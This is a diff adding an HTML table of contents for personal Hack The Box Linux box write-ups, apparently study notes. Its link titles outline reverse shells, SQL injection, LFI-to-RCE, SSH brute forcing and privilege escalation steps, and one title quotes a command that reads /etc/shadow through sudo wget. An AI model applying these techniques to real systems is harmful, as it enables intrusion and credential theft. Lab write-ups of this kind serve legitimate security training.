+</ol>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_w-_shellshock.html">rooting box w/ shellshock </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_w-_shellshock--burp_-bin-echo.html">burp /bin/echo </a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_w-_shellshock--burp_sleep.html">burp sleep</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_w-_shellshock--shellshock_reverse_shell.html">shellshock reverse shell</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_w-_shellshock--listener.html">listener</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_w-_RCE_searchsploit.html">rooting box w/ RCE searchsploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_w-_RCE_searchsploit--priv_esc_w-_sudo_nmap_--interactive_privesc.html">priv esc w/ sudo nmap --interactive privesc</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos.html">cronos</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--http--vi_-etc-hosts.html">vi /etc/hosts</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--dns_xfer_(dig).html">dns xfer (dig)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--dns_xfer_(dig)--www.cronos.htb.html">www.cronos.htb</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--dns_xfer_(dig)--ns1.cronos.htb.html">ns1.cronos.htb</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--dns_xfer_(dig)--admin.cronos.htb.html">admin.cronos.htb</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--sqlmap_admin.cronos.htb.html">sqlmap admin.cronos.htb</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--sqlmap_admin.cronos.htb--login.req.html">login.req</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--sqlmap_admin.cronos.htb--sqlmap_-r_login.req.html">sqlmap -r login.req</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--admin.cronos_injection.html">admin.cronos injection</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--command_execution.html">command execution</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--command_execution--burp_repeater.html">burp repeater</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--command_execution--pentest_monkey_reverse_shell_cheat_sheet.html">pentest monkey reverse shell cheat sheet</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--command_execution--pentest_monkey_reverse_shell_cheat_sheet--burp.html">burp</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--command_execution--pentest_monkey_reverse_shell_cheat_sheet--nc_listener.html">nc listener</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--initial_foothold--command_execution--reverse_shell.html">reverse shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--Enumeration.html">Enumeration</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--Enumeration---dev-shm.html">/dev/shm</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--Enumeration---dev-shm--download_LinEnum.html">download LinEnum</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--Enumeration---dev-shm--run_LinEnum.html">run LinEnum</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--Enumeration---dev-shm--run_LinEnum--Report.html">Report</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--Enumeration---dev-shm--schdeuled_laravel_owned_by_root.html">schdeuled laravel owned by root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php.html">priv esc with Kernel.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--laravel_scheduling_task.html">laravel scheduling task</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--laravel_scheduling_task--find_app-Console-Kernel.php.html">find app/Console/Kernel.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--laravel_scheduling_task--Kernel.php.html">Kernel.php</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--setuid.c.html">setuid.c</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--setuid.c--CURL_program_to_cronos.html">CURL program to cronos</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--setuid.c--update_Kernel.php-_change_owner_of_setuid.c_to_root.html">update Kernel.php/ change owner of setuid.c to root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--setuid.c--move_getuid.c_to_tmp_folder_&_privesc.html">move getuid.c to tmp folder & privesc</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_Kernel.php--setuid.c--root.html">root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_artisan.html">priv esc with artisan</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_artisan--php-reverse-shell.html">php-reverse-shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--cronos--priv_esc_with_kernel_exploit_dirty_cow.html">priv esc with kernel exploit dirty cow</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--cronos--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate.html">solidstate</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--nmap--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--nmap--all_ports.html">all ports</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_4555.html">port 4555</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_4555--telnet.html">telnet </a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_4555--listusers.html">listusers</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_4555--setpassword.html">setpassword</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP.html">port 110 POP</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails.html">users/emails</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--james-no_emails.html">james/no emails</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--thomas-no_emails.html">thomas/no emails</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--john.html">john</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--john--email_1.html">email 1</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--mindy.html">mindy</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--mindy--email_1.html">email 1</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--mindy--email_2.html">email 2</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--port_110_POP--users-emails--mailadmin-no_emails.html">mailadmin/no emails</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--ssh_mindy@10.10.10.51.html">ssh mindy@10.10.10.51</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--ssh_mindy@10.10.10.51--User.txt.html">User.txt</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--james_apache_server_OSI.html">james apache server OSI</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--james_apache_server_OSI--searchsploit.html">searchsploit</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--james_apache_server_OSI--35513.py_RCE.html">35513.py RCE</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--james_apache_server_OSI--35513.py_RCE--run.html">run</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--james_apache_server_OSI--35513.py_RCE--Reverse_Shell.html">Reverse Shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration.html">enumeration</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum.html">LinEnum</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report.html">report</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--system.html">system</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--Users-Groups.html">Users/Groups</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--Environmental.html">Environmental</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--Jobs-Tasks.html">Jobs/Tasks</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--Networking.html">Networking</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--Services.html">Services</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--Software.html">Software</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc--enumeration--LinEnum--report--Interesting.html">Interesting</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc---opt-temp.py.html">/opt/temp.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc---opt-temp.py---tmp-st0ve.html">/tmp/st0ve</a></li>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc---opt-temp.py--add_sticky_bit_to_DASH.html">add sticky bit to DASH</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--privesc---opt-temp.py--add_sticky_bit_to_DASH--root.txt.html">root.txt</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--solidstate--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine.html">valentine</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---index.html">/index</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev.html">/dev</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key.html">hype_key</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key--hex_to_ascii.html">hex to ascii</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--hype_key--vi_hype_key.html">vi hype_key</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---dev--notes.txt.html">notes.txt</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---encode.html">/encode</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---decode.html">/decode</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--http--gobuster---omg.html">/omg</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed.html">initial foothold w/ heartbleed</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--Heartbleed_concept_comic.html">Heartbleed concept comic</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--vi_heartbleed.py.html">vi heartbleed.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--vi_heartbleed.py--heartbleed.py_sourcecode.html">heartbleed.py sourcecode</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed.html">run heartbleeed</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--usage.html">usage </a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20.html">heartbleed.py <target ip> -n 20</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20--interesting_finds.html">interesting finds</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--run_heartbleeed--heartbleed.py_target_ip_-n_20--base_64_text.html">base 64 text</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--initial_foothold_w-_heartbleed--ssh_-i_hype_key_hype@10.10.10.79.html">ssh -i hype_key hype@10.10.10.79</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc.html">priv esc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--linux_smart_enumeration.html">linux smart enumeration</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes.html">notes</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes--ps_-ef__grep_root.html">ps -ef | grep root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--priv_esc--notes--log_onto_root_tmux_session.html">log onto root tmux session</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--valentine--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--valentine--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday.html">sunday</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--nmap--all_ports.html">all ports</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--nmap--targetted_ports.html">targetted ports</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--finger_user_enumeration.html">finger user enumeration</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--finger_user_enumeration--usage.html">usage</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--finger_user_enumeration--scan_report.html">scan report</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--finger_user_enumeration--scan_report--scan_report_on_root.html">scan report on root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_password_brute_force_w-_patador_&_Hydra.html">ssh password brute force w/ patador & Hydra</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_password_brute_force_w-_patador_&_Hydra--finding_good_password_list.html">finding good password list</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_password_brute_force_w-_patador_&_Hydra--sunny_ssh_login_bruteforce.html">sunny ssh_login bruteforce</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_sunny.html">ssh sunny</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_sunny--sudo_-l.html">sudo -l</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_sunny--ls_-.html">ls /</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_sunny--hashcat.html">hashcat</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--ssh_sunny--hashcat--bruteforce.html">bruteforce</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--sammy.html">sammy</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--sammy--sudo_-l_-usr-bin-wget.html">sudo -l /usr/bin/wget</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--sammy--sudo_-l_-usr-bin-wget--sudo_wget_-i_-etc-shadow.html">sudo wget -i /etc/shadow</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--sammy--sudo_-l_-usr-bin-wget--root-troll_script.html">root/troll script</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--sammy--privesc_with_-root-troll.html">privesc with /root/troll</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--sammy--privesc_with_-root-troll--proof_of_overwrite_-root-troll_script_on_root.html">proof of overwrite /root/troll script on root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--potential_shellshock_(fail).html">potential shellshock (fail)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--potential_shellshock_(fail)--assigning_env_variable_to_shellshock_&_testing.html">assigning env variable to shellshock & testing</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow.html">privesc through wget etc/shadow </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow--wget_upload.php.html">wget upload.php </a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow--upload.php.html">upload.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow--useradd_st0ve.html">useradd st0ve</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow--useradd_st0ve--php_server.html">php server</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow--useradd_st0ve--edit_shadow.html">edit shadow</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow--useradd_st0ve--wget_shadow.html">wget shadow</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_through_wget_etc-shadow--useradd_st0ve--log_into_root.html">log into root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sunday--privesc_with_-usr-bin-pfsh.html">privesc with /usr/bin/pfsh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sunday--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh.html">nineveh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--http-https.html">http/https</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--http-https--cert.html">cert</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--http-https--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--http-https--gobuster--http.html">http</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--http-https--gobuster--https.html">https</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--hydra_bf.html">hydra bf</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--hydra_bf---departmnet.html">/departmnet</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--hydra_bf---departmnet--homepage.html">homepage</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--hydra_bf---departmnet--homepage--notes.html">notes</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--hydra_bf---departmnet--homepage--Local_File_Inclusion_Vuln.html">Local File Inclusion Vuln</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--hydra_bf---db.html">/db</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--hydra_bf---db--pass.html">pass</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--initial_foothold--create_database_and_table_w-_malicious_php_system_call.html">create database and table w/ malicious php system call</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--initial_foothold--LFI_to_RCE.html">LFI to RCE</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--initial_foothold--RCE_through_burp.html">RCE through burp</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--initial_foothold--RCE_through_burp--reverse_shell.html">reverse shell</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--initial_foothold--RCE_through_burp--reverse_shell--listener.html">listener</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root--LinEnum.sh.html">LinEnum.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root--PSPY.html">PSPY</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root--PSPY--pspy64.html">pspy64</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root--PSPY--custom_ippsec_procmon_script.html">custom ippsec procmon script</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root--PSPY--custom_ippsec_procmon_script--output.html">output</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root--chkrootkit.html">chkrootkit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root--chkrootkit--exploit-db.com-exploits-33899.html">exploit-db.com/exploits/33899</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--privesc_to_root---tmp-update.html">/tmp/update</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold.html">additional foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold--binwalk.html">binwalk</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold--binwalk--nineveh.priv.html">nineveh.priv</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold--binwalk--nineveh.pub.html">nineveh.pub</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold---etc-knockd.html">/etc/knockd</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold---etc-knockd--nmap_port_knocking.html">nmap port knocking</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold---etc-knockd--nmap_scan.html">nmap scan</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--additional_foothold--ssh.html">ssh</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nineveh--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--shocker.html">shocker</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--shocker--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--shocker--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster--gobuster_10.10.10.56-cgi-bin.html">gobuster 10.10.10.56/cgi-bin</a></li>
+<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster--user.sh.html">user.sh</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--shocker--shellshock_user.sh.html">shellshock user.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--shocker--privesc.html">privesc</a></li>
+<li><a href="HacktheBox--Linux_Boxes--shocker--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--irked.html">irked</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--irked--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--http--gobuster.html">gobuster</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--initial_foothold_UnrealIRCd.html">initial foothold UnrealIRCd</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--initial_foothold_UnrealIRCd--Nmap_script_engine.html">Nmap script engine</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--initial_foothold_UnrealIRCd--Nmap_script_engine--nmap_unrealirc_backdoor.html">nmap unrealirc backdoor</a></li>
+<li><a href="HacktheBox--Linux_Boxes--irked--initial_foothold_UnrealIRCd--Nmap_script_engine--nmap_backdoor_nse.html">nmap backdoor nse</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--initial_foothold_UnrealIRCd--user.txt.html">user.txt</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--steghide_challenge.html">steghide challenge</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--steghide_challenge--steghide.html">steghide</a></li>
+<li><a href="HacktheBox--Linux_Boxes--irked--steghide_challenge--konami_code.html">konami code</a></li>
+<li><a href="HacktheBox--Linux_Boxes--irked--steghide_challenge--djmardov.html">djmardov</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--privesc--lse.sh.html">lse.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--privesc--lse.sh--Report_findings.html">Report findings</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--privesc--viewuser.html">viewuser</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--irked--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--irked--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node.html">node</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source.html">page source</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--home.js.html">home.js</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--home.js---api-users-latest.html">/api/users/latest</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--admin.js.html">admin.js</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--admin.js---api-admin-backup.html">/api/admin/backup</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--profile.js.html">profile.js</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--profile.js---api-users.html">/api/users </a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--login.js.html">login.js</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--page_source--login.js---api-session-authenticate.html">/api/session/authenticate</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--http--crackstation.html">crackstation</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--initial_foothold_on_mark.html">initial foothold on mark</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--initial_foothold_on_mark--backup_download.html">backup download</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--initial_foothold_on_mark--fcrack.html">fcrack</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--initial_foothold_on_mark--fcrack--fcrack_brute_force.html">fcrack brute force</a></li>
